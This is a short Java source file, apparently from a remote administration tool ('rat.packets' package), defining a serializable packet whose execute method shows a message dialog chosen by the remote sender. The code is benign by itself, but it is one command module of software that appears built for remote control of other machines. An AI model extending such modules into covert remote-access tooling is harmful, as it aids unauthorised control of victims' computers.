package rat.packets;

import javax.swing.*;
import java.io.Serializable;

public class MessageBoxPacket implements IPacket, Serializable {

    private static final long serialVersionUID = 4031542105078675727L;

    private int messageBoxType;

    private String message;

    private String title;

    public MessageBoxPacket(String title, String message, int messageBoxType) {
        this.title = title;
        this.message = message;
        this.messageBoxType = messageBoxType;
    }

    @Override
    public void execute() {
        SwingUtilities.invokeLater(() -> {
            //  JOptionPane.showMessageDialog(null, "ALERT MESSAGE", "TITLE", JOptionPane.WARNING_MESSAGE);
            JOptionPane.showMessageDialog(null, message, title, messageBoxType);
        });

    }

    @Override
    public PacketType getPacketType() {
        return PacketType.MESSAGE_BOX;
    }
}
